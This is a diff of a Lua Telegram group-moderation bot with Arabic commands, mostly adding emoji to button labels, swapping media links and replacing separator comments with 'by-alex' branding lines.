 {{text = 'اليكس مبرمج السورس',url="t.me/ALEX_EL_KABEER"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/beborty/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -3314,7 +3294,7 @@ local Text ='تم اختيار الاستوري هذه لك'
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = ' 𝗣𝗢𝗪𝗘𝗥',url="t.me/ALEX_EL_KABEER"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xxvvzm/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -4139,7 +4119,7 @@ local Text = [[
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}}, 
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/FTAGC/12&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -4152,7 +4132,7 @@ local Text = [[
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_POF"}}, 
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/FTAGC/12&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -4190,12 +4170,12 @@ keyboard.inline_keyboard = {
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }  
 local msg_id = msg.id_/2097152/0.5  
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/FTAGC/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == ("انذار") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) and not database:get(bot_id..'NightRang:inthar:group'..msg.chat_id_) then
 function FunctionStatus(arg, result)
 if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
@@ -4365,7 +4345,7 @@ send(msg.chat_id_, msg.id_,' ⌾ تم حفظ الامر')
 database:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_)
 return false
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == "المطور" or text == "مطور" then
 local TEXT_SUD = database:get(bot_id..'Tshake:TEXT_SUDO')
 if TEXT_SUDO then 
@@ -4381,7 +4361,7 @@ keyboard.inline_keyboard = {
 {text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
 },
 {
-{text = 'اضف البوت الي مجموعتك ↯' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
+{text = 'اضف البوت الي مجموعتك 🌚💞 ↯' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -4395,7 +4375,7 @@ end
 end
 if text == "تويت بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
 ght = math.random(1,28); 
-local Text ='مرحبا إليك تويت بالصور' 
+local Text ='مرحبا إليك تويت بالصوره✨🌚' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
@@ -4405,17 +4385,18 @@ https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. ms
 end
 if text == "لو خيروك بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
 ght = math.random(1,24); 
-local Text ='مرحبا اليك لو خيروك بالصوره' 
+local Text ='مرحبا اليك لو خيروك بالصوره🍁🌝' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/bebo44y/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/kbbnv/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
+
 if text == "حروف بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
 ght = math.random(1,15); 
-local Text ='مرحبا إليك حروف بالصوره' 
+local Text ='مرحبا إليك حروف بالصوره✨🌚' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
@@ -5286,7 +5267,7 @@ elseif text == 'فتح التكرار' and Mod(msg) then
 database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
 send(msg.chat_id_, msg.id_,' ⌾ تم فتح التكرار')
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == 'تحديث' and DevSoFi(msg) then    
 dofile('DRAGON.lua')  
 send(msg.chat_id_, msg.id_, ' ⌾ تم تحديث جميع الملفات') 
@@ -5675,7 +5656,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == ("مسح المطورين") and DevSoFi(msg) then
 database:del(bot_id..'Sudo:User')
 send(msg.chat_id_, msg.id_, "\n ⌾ تم مسح قائمة المطورين  ")
@@ -6185,7 +6166,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 
 if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then      
 sticker_id = msg.content_.sticker_.sticker_.persistent_id_
@@ -6297,7 +6278,7 @@ end
 end
 
 -------------------
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == ("مسح الاساسين") and CoSu(msg) then
 database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, '\n ⌾ تم مسح المنشئين الاساسين')
@@ -6481,7 +6462,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == 'مسح المنشئين' and BasicConstructor(msg) then
 database:del(bot_id..'Constructor'..msg.chat_id_)
 texts = ' ⌾ تم مسح المنشئين '
@@ -6587,7 +6568,7 @@ send(msg.chat_id_, msg.id_, texts)
 end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^رفع منشئ (%d+)$") and BasicConstructor(msg) then
 local userid = text:match("^رفع منشئ (%d+)$")
 if AddChannel(msg.sender_user_id_) == false then
@@ -6631,7 +6612,7 @@ end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^تنزيل منشئ @(.*)$") and BasicConstructor(msg) then
 local username = text:match("^تنزيل منشئ @(.*)$")
 if AddChannel(msg.sender_user_id_) == false then
@@ -6656,7 +6637,7 @@ send(msg.chat_id_, msg.id_, texts)
 end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^تنزيل منشئ (%d+)$") and BasicConstructor(msg) then
 local userid = text:match("^تنزيل منشئ (%d+)$")
 if AddChannel(msg.sender_user_id_) == false then
@@ -6680,7 +6661,7 @@ status  = '\n ⌾ تم تنزيله من المنشئين'
 send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == 'مسح المدراء' and Constructor(msg) then
 database:del(bot_id..'Manager'..msg.chat_id_)
 texts = ' ⌾ تم مسح المدراء '
@@ -6864,7 +6845,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
------------------------------------------------------------------------- adddev2 sudog
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex adddev2 sudog
 if text == ("رفع باور") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
 function Function_DRAGON(extra, result, success)
 database:sadd(bot_id.."Dev:SoFi:2", result.sender_user_id_)
@@ -6943,7 +6924,7 @@ if text == ("مسح الثانوين") and SudoBot(msg) then
 database:del(bot_id.."Dev:SoFi:2")
 send(msg.chat_id_, msg.id_, "\n ⌾ تم مسح قائمة المطورين الثانوين  ")
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == ("رفع مدير عام") and msg.reply_to_message_id_ and Constructor(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -7089,7 +7070,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == ("رفع ادمن عام") and msg.reply_to_message_id_ and Constructor(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -7235,7 +7216,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text ==("رفع الادمنيه") and Manager(msg) then
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
 local num2 = 0
@@ -7646,7 +7627,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Mod(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -7788,8 +7769,8 @@ end,nil)
 end
 return false
 end
-------------------------------------------------------------------------
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == 'مسح المميزين' and Mod(msg) then
 database:del(bot_id..'Special:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ⌾ تم مسح المميزين')
@@ -7984,7 +7965,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end  
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == 'مسح المتوحدين' and Mod(msg) then
 database:del(bot_id..'Mote:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ⌾ تم مسح جميع المتوحدين')
@@ -9670,7 +9651,7 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == 'مسح المكتومين' and Mod(msg) then
 database:del(bot_id..'Muted:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ⌾ تم مسح المكتومين')
@@ -9974,7 +9955,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^تقيد @(.*)$") and Mod(msg) then
 local username = text:match("^تقيد @(.*)$")
 if AddChannel(msg.sender_user_id_) == false then
@@ -10085,7 +10066,7 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^تقيد (%d+)$") and Mod(msg) then
 local userid = text:match("^تقيد (%d+)$")
 if AddChannel(msg.sender_user_id_) == false then
@@ -10118,7 +10099,7 @@ end;end,nil)
 end
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == ("الغاء تقيد") and msg.reply_to_message_id_ and Mod(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -10140,7 +10121,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^الغاء تقيد @(.*)$") and Mod(msg) then
 local username = text:match("^الغاء تقيد @(.*)$")
 if AddChannel(msg.sender_user_id_) == false then
@@ -10166,7 +10147,7 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^الغاء تقيد (%d+)$") and Mod(msg) then
 local userid = text:match("^الغاء تقيد (%d+)$")
 if AddChannel(msg.sender_user_id_) == false then
@@ -11964,7 +11945,7 @@ local msg_id = msg.id_/2097152/0.5
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = 'اضف البوت الي مجموعتك ↯' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
+{text = 'اضف البوت الي مجموعتك 🌚💞 ↯' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
 },
 }
 local function getpro(extra, result, success) 
@@ -11999,7 +11980,7 @@ keyboard.inline_keyboard = {
 {text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
 },
 {
-{text = 'اضف البوت الي مجموعتك ↯' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
+{text = 'اضف البوت الي مجموعتك 🌚💞 ↯' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
 },
 }
 local function getpro(extra, result, success) 
@@ -12433,7 +12414,7 @@ local photo = database:get(bot_id.."Add:Rd:Sudo:Photo"..text)
 local video = database:get(bot_id.."Add:Rd:Sudo:Video"..text)
 local document = database:get(bot_id.."Add:Rd:Sudo:File"..text)
 local audio = database:get(bot_id.."Add:Rd:Sudo:Audio"..text)
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^(.*)$") then
 if database:get(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
 send(msg.chat_id_, msg.id_, '\n ⌾ ارسل الكلمه تريد اضافتها')
@@ -12472,7 +12453,7 @@ database:del(bot_id.."botss:DRAGON:List:Rd:Sudo")
 end
 send(msg.chat_id_, msg.id_," ⌾تم مسح ردود المتعدده")
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text1 then 
 send(msg.chat_id_, msg.id_,text1)
 database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
@@ -12669,7 +12650,7 @@ local photo = database:get(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
 local video = database:get(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
 local document = database:get(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
 local audio = database:get(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^قول (.*)$") then
 local Textxt = text:match("^قول (.*)$")
 send(msg.chat_id_, msg.id_, '['..Textxt..']')
@@ -12693,7 +12674,7 @@ local Text ='تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -12707,8 +12688,7 @@ local Text ='الستخدم ثيم اخر اكتب ثيم'
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
-{{text = '00:00', url="t.me/UUK88"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5  
 https.request("https://api.telegram.org/bot"..token..'/sendDocument?chat_id=' .. msg.chat_id_ .. '&document=https://t.me/ahmedthem1/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12725,7 +12705,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12736,7 +12716,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/19&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12747,7 +12727,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = ' 《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/comxnxp/20&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12758,7 +12738,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = ' 《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Qtdao/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12769,7 +12749,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = ' 《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/Qtdao/15&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12780,7 +12760,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/21&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12791,7 +12771,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qtdao/16&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -12802,7 +12782,7 @@ local Text =' '
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》 ', url="t.me/XV_VM"}}, 
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&Photo=https://t.me/wffhvv/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -13090,7 +13070,7 @@ Textes = math.random(#texting)
 send(msg.chat_id_, msg.id_,texting[Textes])
 end
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text1 then 
 send(msg.chat_id_, msg.id_, text1)
 database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
@@ -13319,8 +13299,9 @@ end
 
 if text == 'رتبتي' then
 local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-send(msg.chat_id_, msg.id_,' رتبتك ↝ '..rtp..' ↜ ⌾\n ') 
+send(msg.chat_id_, msg.id_,' رتبتك 「 '..rtp..' 」 🌚\n  √') 
 end
+
 if text == "تفعيل انا مين"  then
 if Constructor(msg) then  
 database:set(bot_id.."my_anamen:status"..msg.chat_id_,true) 
@@ -16219,7 +16200,7 @@ database:del(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)
 database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..iduserr,numadded)  
 send(msg.chat_id_, msg.id_," ⌾ تم اضافة له {"..numadded..'} من الرسائل')  
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if database:get(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
 database:del(bot_id..'idgem:user'..msg.chat_id_)  
@@ -16241,7 +16222,7 @@ database:setex(bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id
 send(msg.chat_id_, msg.id_, ' ⌾ ارسل لي عدد الرسائل الان') 
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
 sofi = text:match("^اضف نقاط (%d+)$")
 database:set(bot_id..'idgem:user'..msg.chat_id_,sofi)  
@@ -16249,7 +16230,7 @@ database:setex(bot_id.."gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id
 send(msg.chat_id_, msg.id_, ' ⌾ ارسل لي عدد النقاط التي تريد اضافتها') 
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
